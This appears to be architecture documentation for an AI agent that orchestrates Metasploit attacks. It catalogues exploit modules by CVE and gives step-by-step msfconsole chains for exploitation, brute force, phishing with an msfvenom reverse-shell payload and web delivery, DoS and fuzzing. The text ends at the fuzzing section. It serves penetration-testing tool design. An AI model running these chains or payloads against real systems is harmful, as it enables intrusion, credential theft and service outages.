# RedAmon Attack Paths Architecture

Comprehensive documentation of all Metasploit attack path categories and the proposed Agent Routing system for intelligent attack chain orchestration.

> **Context**: The current RedAmon agent implementation supports CVE-based exploitation chains. This document defines all possible attack path categories to enable evolution toward a multi-path routing system.

---

## Table of Contents

1. [Current Implementation Analysis](#current-implementation-analysis)
2. [Metasploit Module Taxonomy](#metasploit-module-taxonomy)
3. [Attack Path Categories](#attack-path-categories)
   - [Category 1: CVE-Based Exploitation](#category-1-cve-based-exploitation-current)
   - [Category 2: Brute Force / Credential Attacks](#category-2-brute-force--credential-attacks)
   - [Category 3: Social Engineering / Phishing](#category-3-social-engineering--phishing)
   - [Category 4: Denial of Service (DoS)](#category-4-denial-of-service-dos)
   - [Category 5: Fuzzing / Vulnerability Discovery](#category-5-fuzzing--vulnerability-discovery)
   - [Category 6: Credential Capture / MITM](#category-6-credential-capture--mitm)
   - [Category 7: Wireless / Network Attacks](#category-7-wireless--network-attacks)
   - [Category 8: Web Application Attacks](#category-8-web-application-attacks)
   - [Category 9: Client-Side Exploitation](#category-9-client-side-exploitation)
   - [Category 10: Local Privilege Escalation](#category-10-local-privilege-escalation)
4. [Agent Routing Architecture](#agent-routing-architecture)
5. [Post-Exploitation Considerations](#post-exploitation-considerations)
6. [Implementation Roadmap](#implementation-roadmap)

---

## Current Implementation Analysis

### Existing CVE-Based Attack Chain

The current orchestrator (`orchestrator.py`) implements a single attack path category: **CVE-Based Exploitation**.

```
┌─────────────────────────────────────────────────────────────────┐
│                    CURRENT: CVE-BASED CHAIN                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. search CVE-XXXX-XXXXX     → Find exploit module path        │
│  2. use exploit/path/...      → Load module                      │
│  3. info                      → Get module description           │
│  4. show targets              → List OS/app versions             │
│  5. show options              → Display configurable params      │
│  6. set TARGET <N>            → Select target type               │
│  7. show payloads             → List compatible payloads         │
│  8. set CVE CVE-XXXX-XXXXX    → Set CVE variant (if applicable) │
│  9. set PAYLOAD <payload>     → Choose payload                   │
│  10. set RHOSTS/RPORT/SSL     → Configure connection             │
│  11. set LHOST/LPORT (or CMD) → Mode-specific options            │
│  12. exploit                  → Execute                          │
│                                                                  │
│  Post-Exploitation: Meterpreter (statefull) or re-run (stateless)│
└─────────────────────────────────────────────────────────────────┘
```

### Limitations of Current Approach

1. **Single Entry Point**: Only supports `search CVE-*` as starting command
2. **Assumes Exploit Module**: Designed for `exploit/*` modules only
3. **Fixed Workflow**: 12-step sequence doesn't adapt to different attack types
4. **No Auxiliary Support**: Brute force, scanning, fuzzing not natively supported
5. **No Social Engineering**: Phishing, client-side attacks not supported

---

## Metasploit Module Taxonomy

Understanding the full module taxonomy is essential for routing decisions.

### Module Types (7 Categories)

| Type | Count | Purpose | Post-Expl Phase? |
|------|-------|---------|------------------|
| **exploit** | ~2,300+ | Actively exploit vulnerabilities | Yes |
| **auxiliary** | ~1,120+ | Scanning, brute force, fuzzing, DoS, capture | Sometimes |
| **post** | ~350+ | Post-exploitation actions | N/A (IS post) |
| **payload** | ~600+ | Code executed after exploitation | N/A |
| **encoder** | ~50+ | Payload encoding (bad chars, NOT AV evasion) | N/A |
| **evasion** | ~10+ | AV/EDR bypass payload generation | N/A |
| **nop** | ~10+ | NOP sled generation for buffer overflows | N/A |

### Auxiliary Module Subcategories

```
auxiliary/
├── admin/          # Administrative tasks on compromised systems
├── analyze/        # Password hash analysis, time-based operations
├── client/         # Client-side tools (SMTP, browser)
├── crawler/        # Web crawlers and spiders
├── docx/           # Document-based attacks
├── dos/            # Denial of Service modules
├── fileformat/     # Malicious file generation
├── fuzzers/        # Protocol and input fuzzers
├── gather/         # Information gathering
├── parser/         # Log and data parsers
├── pdf/            # PDF-based attacks
├── scanner/        # Network and service scanners
│   ├── discovery/  # Host discovery
│   ├── ftp/        # FTP enumeration/brute force
│   ├── http/       # HTTP scanning
│   ├── mssql/      # MSSQL enumeration
│   ├── mysql/      # MySQL enumeration
│   ├── pop3/       # POP3 enumeration
│   ├── postgres/   # PostgreSQL enumeration
│   ├── rdp/        # RDP scanning
│   ├── smb/        # SMB enumeration/brute force
│   ├── smtp/       # SMTP enumeration
│   ├── snmp/       # SNMP scanning
│   ├── ssh/        # SSH brute force
│   ├── telnet/     # Telnet brute force
│   ├── vnc/        # VNC scanning
│   └── ...         # Many more protocols
├── server/         # Fake servers for credential capture
│   └── capture/    # Credential harvesting (SMB, HTTP, FTP)
├── spoof/          # Spoofing modules (ARP, NBNS, etc.)
├── sqli/           # SQL injection tools
├── voip/           # VoIP-related modules
└── ...
```

---

## Attack Path Categories

### Category Overview

| # | Category | Entry Point | Module Type | Post-Expl? | Complexity |
|---|----------|-------------|-------------|------------|------------|
| 1 | CVE-Based Exploitation | `search CVE-*` | exploit | Yes | High |
| 2 | Brute Force / Credential | `use auxiliary/scanner/*/login` | auxiliary | Sometimes | Medium |
| 3 | Social Engineering | `use auxiliary/server/*` | auxiliary/exploit | Yes | High |
| 4 | DoS / Availability | `use auxiliary/dos/*` | auxiliary | No | Low |
| 5 | Fuzzing / Discovery | `use auxiliary/fuzzers/*` | auxiliary | No | Low |
| 6 | Credential Capture | `use auxiliary/server/capture/*` | auxiliary | Sometimes | Medium |
| 7 | Wireless Attacks | `use auxiliary/spoof/*` | auxiliary | Sometimes | Medium |
| 8 | Web Application | `use auxiliary/scanner/http/*` | auxiliary/exploit | Sometimes | Medium |
| 9 | Client-Side Exploitation | `use exploit/*/browser/*` | exploit | Yes | High |
| 10 | Local Privilege Escalation | `use exploit/*/local/*` | exploit/post | N/A | Medium |

---

## Category 1: CVE-Based Exploitation (Current)

**Description**: Exploit known vulnerabilities identified by CVE identifier or MS bulletin.

**Entry Detection Keywords**: `CVE-`, `MS17-`, `exploit`, `vulnerability`, `pwn`, `hack`, `rce`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              CVE-BASED EXPLOIT CHAIN                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. search CVE-XXXX-XXXXX     → Find exploit module path        │
│  2. use exploit/path/...      → Load module                      │
│  3. info                      → Get module description           │
│  4. show targets              → List OS/app versions             │
│  5. show options              → Display configurable params      │
│  6. set TARGET <N>            → Select target type               │
│  7. show payloads             → List compatible payloads         │
│  8. set PAYLOAD <payload>     → Choose payload                   │
│  9. set RHOSTS/RPORT/SSL      → Configure connection             │
│  10. set LHOST/LPORT (or CMD) → Mode-specific options            │
│  11. exploit                  → Execute                          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Post-Exploitation**:
- Statefull: Meterpreter session → transition to post_exploitation phase
- Stateless: Command output captured → optionally re-run with different CMD

### 1.1 Remote Code Execution (RCE) Exploits

| # | Attack Type | Description | CVE/Module | Metasploit Module |
|---|-------------|-------------|------------|-------------------|
| 1 | **Path Traversal RCE** | Exploits path normalization flaws to execute code via CGI | CVE-2021-41773, CVE-2021-42013 | `exploit/multi/http/apache_normalize_path_rce` |
| 2 | **Deserialization RCE** | Exploits insecure deserialization in Java, PHP, .NET | CVE-2015-4852 | `exploit/multi/misc/weblogic_deserialize` |
| 3 | **Command Injection** | Injects OS commands through vulnerable parameters | Various | `exploit/unix/webapp/*_cmd_exec` |
| 4 | **Server-Side Template Injection (SSTI)** | Exploits template engines (Jinja2, Twig, Freemarker) | CVE-2019-11581 | `exploit/multi/http/jira_*` |
| 5 | **Log4Shell** | JNDI injection in Log4j leading to RCE | CVE-2021-44228 | `exploit/multi/http/log4shell_header_injection` |
| 6 | **Spring4Shell** | Spring Framework RCE via data binding | CVE-2022-22965 | `exploit/multi/http/spring_framework_rce_spring4shell` |
| 7 | **Shellshock** | Bash environment variable injection via CGI | CVE-2014-6271 | `exploit/multi/http/apache_mod_cgi_bash_env_exec` |
| 8 | **ImageMagick RCE (ImageTragick)** | Exploits image processing libraries | CVE-2016-3714 | `exploit/unix/fileformat/imagemagick_delegate` |
| 9 | **FFmpeg SSRF/RCE** | Exploits video processing to read files or execute code | CVE-2016-1897 | `exploit/unix/webapp/ffmpeg_*` |
| 10 | **PHP Object Injection** | Exploits unserialize() for code execution | Various | `exploit/multi/http/php_*` |

### 1.2 Service-Specific CVE Exploits

| # | Attack Type | Description | CVE/Module | Metasploit Module |
|---|-------------|-------------|------------|-------------------|
| 11 | **SMB EternalBlue** | Windows SMB RCE | MS17-010 | `exploit/windows/smb/ms17_010_eternalblue` |
| 12 | **SMB MS08-067** | Windows Server Service NetAPI exploit | MS08-067 | `exploit/windows/smb/ms08_067_netapi` |
| 13 | **RDP BlueKeep** | Remote Desktop Protocol pre-auth RCE | CVE-2019-0708 | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
| 14 | **Redis Unauthorized Access** | Exploits unauthenticated Redis for RCE | N/A | `exploit/linux/redis/redis_replication_cmd_exec` |
| 15 | **Elasticsearch RCE** | Search engine misconfigurations | CVE-2014-3120 | `exploit/multi/elasticsearch/script_mvel_rce` |
| 16 | **vsftpd 2.3.4 Backdoor** | Exploits backdoor in FTP server | N/A | `exploit/unix/ftp/vsftpd_234_backdoor` |
| 17 | **ProFTPd mod_copy** | Arbitrary file copy leading to RCE | CVE-2015-3306 | `exploit/unix/ftp/proftpd_modcopy_exec` |
| 18 | **Samba Usermap Script** | Samba username map script command execution | CVE-2007-2447 | `exploit/multi/samba/usermap_script` |
| 19 | **OpenSSH AuthorizedKeysCommand** | SSH RCE via AuthorizedKeysCommand | CVE-2016-10009 | `exploit/linux/ssh/openssh_authkeys_backdoor` |
| 20 | **VNC Authentication Bypass** | Exploits weak/no authentication | CVE-2006-2369 | `auxiliary/scanner/vnc/vnc_none_auth` |

### 1.3 Email & Messaging CVE Exploits

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 21 | **Exchange ProxyLogon** | Pre-auth RCE on Exchange | CVE-2021-26855 | `exploit/windows/http/exchange_proxylogon_rce` |
| 22 | **Exchange ProxyShell** | Chain of vulnerabilities for RCE | CVE-2021-34473 | `exploit/windows/http/exchange_proxyshell_rce` |
| 23 | **Exim RCE** | Multiple RCE in Exim MTA | CVE-2019-15846 | `exploit/linux/smtp/exim_*` |
| 24 | **Zimbra RCE** | Multiple RCE vulnerabilities | CVE-2022-27925 | `exploit/linux/http/zimbra_*` |
| 25 | **Roundcube Exploitation** | Webmail application vulnerabilities | CVE-2020-12640 | `exploit/linux/http/roundcube_*` |

### 1.4 Database CVE Exploits

| # | Attack Type | Description | CVE/Module | Metasploit Module |
|---|-------------|-------------|------------|-------------------|
| 26 | **MySQL UDF Injection** | User-defined function injection for code execution | N/A | `exploit/multi/mysql/mysql_udf_payload` |
| 27 | **PostgreSQL RCE** | Large object and COPY exploitation | N/A | `exploit/linux/postgres/postgres_payload` |
| 28 | **MSSQL xp_cmdshell** | Command execution via stored procedures | N/A | `exploit/windows/mssql/mssql_payload` |
| 29 | **CouchDB RCE** | Admin party and CVE exploits | CVE-2017-12635 | `exploit/linux/http/couchdb_exec` |
| 30 | **H2 Database Console RCE** | Exploits H2 web console | CVE-2021-42392 | `exploit/multi/http/h2_console_rce` |
| 31 | **Apache Solr RCE** | Velocity template injection | CVE-2019-17558 | `exploit/multi/http/solr_velocity_rce` |

### 1.5 CMS & Framework CVE Exploits

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 32 | **WordPress Plugin RCE** | Exploits vulnerable plugins | Various | `exploit/unix/webapp/wp_*` |
| 33 | **Drupalgeddon** | Drupal RCE via AJAX form API | CVE-2018-7600 | `exploit/unix/webapp/drupal_drupalgeddon2` |
| 34 | **Joomla RCE** | Object injection exploits | CVE-2015-8562 | `exploit/multi/http/joomla_*` |
| 35 | **Magento RCE** | E-commerce platform vulnerabilities | CVE-2019-8144 | `exploit/multi/http/magento_*` |
| 36 | **Laravel Debug Mode RCE** | Exploits exposed debug mode | CVE-2021-3129 | `exploit/unix/http/laravel_ignition_rce` |
| 37 | **ThinkPHP RCE** | Multiple RCE vulnerabilities | CVE-2018-20062 | `exploit/multi/http/thinkphp_*` |
| 38 | **Ruby on Rails RCE** | Deserialization and other CVEs | CVE-2013-0156 | `exploit/multi/http/rails_*` |
| 39 | **vBulletin RCE** | Pre-auth RCE in forum software | CVE-2019-16759 | `exploit/multi/http/vbulletin_*` |
| 40 | **phpMyAdmin RCE** | Database management tool vulnerabilities | CVE-2016-5734 | `exploit/multi/http/phpmyadmin_*` |

### 1.6 Network Infrastructure CVE Exploits

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 41 | **Cisco IOS Exploitation** | Router/switch command injection | Various | `exploit/linux/misc/cisco_*` |
| 42 | **Juniper Backdoor** | Authentication bypass | CVE-2015-7755 | `exploit/linux/ssh/juniper_backdoor` |
| 43 | **MikroTik RouterOS RCE** | Winbox and webfig exploitation | CVE-2018-14847 | `exploit/linux/misc/mikrotik_*` |
| 44 | **Fortinet FortiOS RCE** | VPN and firewall exploitation | CVE-2018-13379 | `auxiliary/scanner/http/fortinet_ssl_vpn` |
| 45 | **Palo Alto GlobalProtect** | VPN gateway vulnerabilities | CVE-2019-1579 | `exploit/linux/http/paloalto_*` |
| 46 | **SonicWall SSLVPN RCE** | VPN appliance exploitation | CVE-2021-20016 | `exploit/linux/http/sonicwall_*` |
| 47 | **Citrix ADC/Gateway RCE** | Path traversal RCE | CVE-2019-19781 | `exploit/linux/http/citrix_dir_traversal_rce` |
| 48 | **F5 BIG-IP RCE** | TMUI RCE | CVE-2020-5902 | `exploit/linux/http/f5_bigip_tmui_rce` |
| 49 | **Pulse Secure VPN RCE** | Arbitrary file read | CVE-2019-11510 | `auxiliary/scanner/http/pulse_ssl_vpn` |

### 1.7 Container & Cloud Exploits

| # | Attack Type | Description | Target | Metasploit Module |
|---|-------------|-------------|--------|-------------------|
| 50 | **Docker API RCE** | Exploits exposed Docker daemon API | Port 2375/2376 | `exploit/linux/http/docker_daemon_tcp` |
| 51 | **Kubernetes API Exploitation** | Exploits misconfigured K8s clusters | Port 6443/10250 | `auxiliary/scanner/http/kubernetes_*` |
| 52 | **Docker Container Escape** | Breaks out of container isolation | Privileged containers | `post/multi/escalate/docker_*` |
| 53 | **AWS Metadata SSRF** | Accesses EC2 instance metadata | 169.254.169.254 | `auxiliary/scanner/http/aws_*` |
| 54 | **etcd Unauthenticated Access** | Extracts secrets from K8s etcd | Port 2379 | `auxiliary/scanner/http/etcd_*` |
| 55 | **HashiCorp Consul Exploitation** | Consul RCE | Port 8500 | `exploit/multi/http/consul_*` |

---

## Category 2: Brute Force / Credential Attacks

**Description**: Password guessing attacks against authentication services.

**Entry Detection Keywords**: `brute`, `password`, `credential`, `login`, `crack`, `spray`, `guess`, `dictionary`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              BRUTE FORCE ATTACK CHAIN                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use auxiliary/scanner/<proto>/<proto>_login                 │
│                                                                  │
│  2. show options               → Display module options          │
│                                                                  │
│  3. set RHOSTS <target>        → Target IP/range                 │
│  4. set RPORT <port>           → Target port (if non-default)    │
│                                                                  │
│  5. Credential configuration (choose one):                       │
│     a) Single credential:                                        │
│        - set USERNAME <user>                                     │
│        - set PASSWORD <pass>                                     │
│     b) User list:                                                │
│        - set USER_FILE /path/to/users.txt                       │
│        - set PASS_FILE /path/to/passwords.txt                   │
│     c) Combined file:                                            │
│        - set USERPASS_FILE /path/to/creds.txt                   │
│                                                                  │
│  6. set BRUTEFORCE_SPEED 3     → Speed (0=slow/stealth, 5=fast) │
│  7. set STOP_ON_SUCCESS true   → Stop when creds found          │
│                                                                  │
│  8. run                        → Execute (NOT "exploit")         │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Key Differences from CVE Chain**:
- Uses `run` not `exploit`
- No TARGET selection
- No PAYLOAD selection
- Requires wordlists/credential configuration

### Metasploit Built-in Wordlists

Metasploit includes a comprehensive collection of wordlists at:
```
/usr/share/metasploit-framework/data/wordlists/
```

**General Purpose Wordlists**:
| File | Description | Use Case |
|------|-------------|----------|
| `unix_passwords.txt` | Common Unix/Linux passwords | SSH, Telnet, FTP brute force |
| `unix_users.txt` | Common Unix usernames | Username enumeration |
| `password.lst` | General password list | Multi-protocol attacks |
| `burnett_top_1024.txt` | Top 1024 most common passwords | Quick password spray |
| `piata_ssh_userpass.txt` | SSH username:password combos | SSH-specific attacks |
| `common_roots.txt` | Common root passwords | Privilege escalation attempts |

**Service-Specific Wordlists**:
| File | Service | Description |
|------|---------|-------------|
| `db2_default_userpass.txt` | IBM DB2 | Default DB2 credentials |
| `tomcat_mgr_default_userpass.txt` | Apache Tomcat | Tomcat Manager defaults |
| `oracle_default_userpass.txt` | Oracle DB | Oracle database defaults |
| `postgres_default_userpass.txt` | PostgreSQL | PostgreSQL defaults |
| `mssql_default_userpass.txt` | MSSQL | Microsoft SQL Server defaults |
| `mirai_user.txt` / `mirai_pass.txt` | IoT devices | Mirai botnet credentials |
| `snmp_default_pass.txt` | SNMP | Default SNMP community strings |
| `vnc_passwords.txt` | VNC | Common VNC passwords |
| `http_default_userpass.txt` | Web apps | HTTP Basic Auth defaults |

**Updated Workflow with Built-in Wordlists**:
```
┌─────────────────────────────────────────────────────────────────────────────┐
│              BRUTE FORCE WITH METASPLOIT WORDLISTS                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  5. Credential configuration (choose one):                                   │
│                                                                              │
│     a) Using built-in general wordlists:                                     │
│        - set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
│        - set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
│                                                                              │
│     b) Using service-specific defaults (recommended for known services):     │
│        - set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
│                                                                              │
│     c) Quick password spray (top 1024):                                      │
│        - set PASS_FILE /usr/share/metasploit-framework/data/wordlists/burnett_top_1024.txt
│                                                                              │
│     d) SSH-specific combo file:                                              │
│        - set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Listing Available Wordlists in msfconsole**:
```bash
# From within msfconsole, find wordlists:
ls /usr/share/metasploit-framework/data/wordlists/

# Or search for specific type:
ls /usr/share/metasploit-framework/data/wordlists/*pass*
ls /usr/share/metasploit-framework/data/wordlists/*user*
```

### 2.1 Network Service Brute Force

| # | Attack Type | Service | Default Port | Metasploit Module |
|---|-------------|---------|--------------|-------------------|
| 1 | **SSH Brute Force** | SSH | 22 | `auxiliary/scanner/ssh/ssh_login` |
| 2 | **FTP Brute Force** | FTP | 21 | `auxiliary/scanner/ftp/ftp_login` |
| 3 | **Telnet Brute Force** | Telnet | 23 | `auxiliary/scanner/telnet/telnet_login` |
| 4 | **SMB Brute Force** | SMB | 445 | `auxiliary/scanner/smb/smb_login` |
| 5 | **RDP Brute Force** | RDP | 3389 | `auxiliary/scanner/rdp/rdp_scanner` |
| 6 | **VNC Brute Force** | VNC | 5900 | `auxiliary/scanner/vnc/vnc_login` |
| 7 | **WinRM Brute Force** | WinRM | 5985 | `auxiliary/scanner/winrm/winrm_login` |
| 8 | **SNMP Community Brute** | SNMP | 161 | `auxiliary/scanner/snmp/snmp_login` |
| 9 | **LDAP Brute Force** | LDAP | 389 | `auxiliary/scanner/ldap/ldap_login` |
| 10 | **Kerberos Brute Force** | Kerberos | 88 | `auxiliary/scanner/kerberos/kerberos_login` |

### 2.2 Database Brute Force

| # | Attack Type | Service | Default Port | Metasploit Module |
|---|-------------|---------|--------------|-------------------|
| 11 | **MySQL Brute Force** | MySQL | 3306 | `auxiliary/scanner/mysql/mysql_login` |
| 12 | **MSSQL Brute Force** | MSSQL | 1433 | `auxiliary/scanner/mssql/mssql_login` |
| 13 | **PostgreSQL Brute Force** | PostgreSQL | 5432 | `auxiliary/scanner/postgres/postgres_login` |
| 14 | **Oracle Brute Force** | Oracle | 1521 | `auxiliary/scanner/oracle/oracle_login` |
| 15 | **MongoDB Brute Force** | MongoDB | 27017 | `auxiliary/scanner/mongodb/mongodb_login` |
| 16 | **Redis Auth Brute** | Redis | 6379 | `auxiliary/scanner/redis/redis_login` |
| 17 | **Cassandra Brute Force** | Cassandra | 9042 | `auxiliary/scanner/cassandra/cassandra_login` |

### 2.3 Email Service Brute Force

| # | Attack Type | Service | Default Port | Metasploit Module |
|---|-------------|---------|--------------|-------------------|
| 18 | **POP3 Brute Force** | POP3 | 110 | `auxiliary/scanner/pop3/pop3_login` |
| 19 | **IMAP Brute Force** | IMAP | 143 | `auxiliary/scanner/imap/imap_login` |
| 20 | **SMTP Brute Force** | SMTP | 25 | `auxiliary/scanner/smtp/smtp_login` |

### 2.4 Web Application Brute Force

| # | Attack Type | Service | Default Port | Metasploit Module |
|---|-------------|---------|--------------|-------------------|
| 21 | **HTTP Basic Auth Brute** | HTTP | 80/443 | `auxiliary/scanner/http/http_login` |
| 22 | **WordPress Login Brute** | WordPress | 80/443 | `auxiliary/scanner/http/wordpress_login_enum` |
| 23 | **Tomcat Manager Brute** | Tomcat | 8080 | `auxiliary/scanner/http/tomcat_mgr_login` |
| 24 | **Jenkins Login Brute** | Jenkins | 8080 | `auxiliary/scanner/http/jenkins_login` |
| 25 | **Joomla Login Brute** | Joomla | 80/443 | `auxiliary/scanner/http/joomla_login_enum` |
| 26 | **Drupal Login Brute** | Drupal | 80/443 | `auxiliary/scanner/http/drupal_login_enum` |
| 27 | **GitLab Login Brute** | GitLab | 80/443 | `auxiliary/scanner/http/gitlab_login` |
| 28 | **phpMyAdmin Brute** | phpMyAdmin | 80/443 | `auxiliary/scanner/http/phpmyadmin_login` |

### 2.5 Credential Spraying (Multi-Account)

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 29 | **SMB Password Spray** | Tests common passwords across accounts | `auxiliary/scanner/smb/smb_login` (with PASS_FILE) |
| 30 | **OWA Password Spray** | Outlook Web Access spraying | `auxiliary/scanner/http/owa_login` |
| 31 | **Lync/Skype Spray** | Microsoft Lync/Skype for Business | `auxiliary/scanner/http/lync_login` |

**Post-Exploitation**:
- SSH: If `ssh_login` succeeds with `CreateSession: true`, get shell session
- SMB: Use captured credentials with `psexec` or other SMB exploits
- Database: Direct database access for data exfiltration

---

## Category 3: Social Engineering / Phishing

**Description**: Attacks targeting human factors rather than technical vulnerabilities.

**Entry Detection Keywords**: `phish`, `social`, `email`, `campaign`, `usb`, `malicious`, `fake`, `clone`, `spear`

### 3.1 Phishing Email Campaign

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              PHISHING CAMPAIGN CHAIN                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Generate payload:                                            │
│     msfvenom -p windows/meterpreter/reverse_tcp                 │
│              LHOST=<attacker> LPORT=<port> -f exe > payload.exe │
│                                                                  │
│  2. Set up handler:                                              │
│     use exploit/multi/handler                                    │
│     set PAYLOAD windows/meterpreter/reverse_tcp                 │
│     set LHOST <attacker>                                         │
│     set LPORT <port>                                             │
│     exploit -j                                                   │
│                                                                  │
│  3. Deliver payload via phishing (SET or manual)                │
│                                                                  │
│  4. Wait for victim to execute                                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Web Delivery Attack

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              WEB DELIVERY CHAIN                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use exploit/multi/script/web_delivery                       │
│  2. set TARGET <0=Python, 1=PHP, 2=PSH, 3=Regsvr32, etc.>      │
│  3. set PAYLOAD <windows/meterpreter/reverse_tcp>               │
│  4. set LHOST <attacker>                                         │
│  5. set LPORT <port>                                             │
│  6. set SRVPORT <web_server_port>                               │
│  7. exploit -j                                                   │
│                                                                  │
│  Output: One-liner command to trick victim into running         │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Social Engineering Modules

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **Multi Handler** | Generic payload handler for callbacks | `exploit/multi/handler` |
| 2 | **Web Delivery (Python)** | Python-based payload delivery | `exploit/multi/script/web_delivery` |
| 3 | **Web Delivery (PowerShell)** | PowerShell-based payload delivery | `exploit/multi/script/web_delivery` (TARGET 2) |
| 4 | **Web Delivery (Regsvr32)** | COM scriptlet delivery | `exploit/multi/script/web_delivery` (TARGET 3) |
| 5 | **HTA Delivery** | HTML Application delivery | `exploit/windows/misc/hta_server` |
| 6 | **Office Macro Payload** | Malicious Office document | `exploit/multi/fileformat/office_*` |
| 7 | **PDF Exploit** | Malicious PDF file | `exploit/multi/fileformat/adobe_*` |
| 8 | **USB Rubber Ducky** | BadUSB HID attacks | Payload generation with msfvenom |
| 9 | **Fake Update Page** | Browser fake update | `auxiliary/server/browser_autopwn2` |
| 10 | **DNS Hijack Phishing** | Redirects to fake pages | Combine with `auxiliary/spoof/dns/*` |

### 3.4 Malicious Document Generation

| # | File Type | Description | Metasploit Module |
|---|-----------|-------------|-------------------|
| 11 | **Word Macro** | VBA macro payload | `exploit/multi/fileformat/office_word_macro` |
| 12 | **Excel Macro** | Excel VBA macro | `exploit/multi/fileformat/office_excel_macro` |
| 13 | **PDF (Adobe Reader)** | PDF embedded payload | `exploit/windows/fileformat/adobe_pdf_*` |
| 14 | **RTF (CVE-2017-0199)** | RTF HTA handler | `exploit/windows/fileformat/office_word_hta` |
| 15 | **LNK File** | Malicious shortcut | `exploit/windows/fileformat/lnk_*` |

---

## Category 4: Denial of Service (DoS)

**Description**: Attacks that disrupt availability rather than gain access.

**Entry Detection Keywords**: `dos`, `denial`, `crash`, `disrupt`, `availability`, `slowloris`, `flood`, `exhaust`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              DoS ATTACK CHAIN                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use auxiliary/dos/<protocol>/<module>                       │
│  2. show options                                                 │
│  3. set RHOSTS <target>                                          │
│  4. set RPORT <port>                                             │
│  5. (Module-specific options)                                    │
│  6. run                                                          │
│                                                                  │
│  ** NO POST-EXPLOITATION - Mark complete after run **           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Post-Exploitation**: **NONE** - DoS attacks don't provide access

### 4.1 HTTP/Web DoS

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **Slowloris** | Keeps connections open exhausting server | `auxiliary/dos/http/slowloris` |
| 2 | **Apache Range DoS** | Range header byte-range attack | `auxiliary/dos/http/apache_range_dos` |
| 3 | **Apache mod_isapi DoS** | Apache module crash | `auxiliary/dos/http/apache_mod_isapi` |
| 4 | **IIS HTTP Request DoS** | IIS-specific DoS | `auxiliary/dos/http/ms15_034_ulonglongadd` |
| 5 | **Hashcollision DoS** | Hash table collision | `auxiliary/dos/http/hashcollision_dos` |

### 4.2 Network Protocol DoS

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 6 | **TCP SYN Flood** | SYN packet flood | `auxiliary/dos/tcp/synflood` |
| 7 | **UDP Flood** | UDP packet flood | `auxiliary/dos/udp/udp_flood` |
| 8 | **ICMP Flood** | Ping flood | `auxiliary/dos/icmp/icmp_flood` |
| 9 | **Smurf Attack** | ICMP broadcast amplification | `auxiliary/dos/icmp/smurf` |

### 4.3 Service-Specific DoS

| # | Attack Type | Description | CVE/MS | Metasploit Module |
|---|-------------|-------------|--------|-------------------|
| 10 | **RDP MS12-020** | RDP pre-auth DoS | MS12-020 | `auxiliary/dos/windows/rdp/ms12_020_maxchannelids` |
| 11 | **SMB DoS** | SMB service crash | Various | `auxiliary/dos/windows/smb/ms*` |
| 12 | **FTP DoS** | FTP service crash | Various | `auxiliary/dos/ftp/*` |
| 13 | **SSH DoS** | SSH service exhaustion | Various | `auxiliary/dos/ssh/*` |
| 14 | **DNS Amplification** | DNS response amplification | N/A | `auxiliary/dos/dns/*` |
| 15 | **SNMP DoS** | SNMP service crash | Various | `auxiliary/dos/snmp/*` |

---

## Category 5: Fuzzing / Vulnerability Discovery

**Description**: Send malformed input to discover new vulnerabilities.

**Entry Detection Keywords**: `fuzz`, `crash`, `discover`, `overflow`, `mutation`, `test input`, `bug hunting`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              FUZZING CHAIN                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use auxiliary/fuzzers/<protocol>/<fuzzer>                   │
│  2. show options                                                 │
│  3. set RHOSTS <target>                                          │
│  4. set RPORT <port>                                             │
│  5. (Fuzzer-specific options like STARTSIZE, ENDSIZE, FIELDS)   │
│  6. run                                                          │
│  7. Monitor target for crashes/anomalies                        │
│                                                                  │
│  ** NO POST-EXPLOITATION - Chain to CVE research if found **    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Post-Exploitation**: **NONE** - Fuzzing is reconnaissance, not exploitation

### 5.1 Protocol Fuzzers

| # | Protocol | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 1 | **HTTP Header Fuzzer** | Fuzz HTTP headers | `auxiliary/fuzzers/http/http_form_field` |
| 2 | **HTTP Cookie Fuzzer** | Fuzz HTTP cookies | `auxiliary/fuzzers/http/http_cookie` |
| 3 | **FTP Fuzzer** | Fuzz FTP commands | `auxiliary/fuzzers/ftp/ftp_pre_post` |
| 4 | **SSH Fuzzer** | Fuzz SSH key exchange | `auxiliary/fuzzers/ssh/ssh_kexinit_corrupt` |
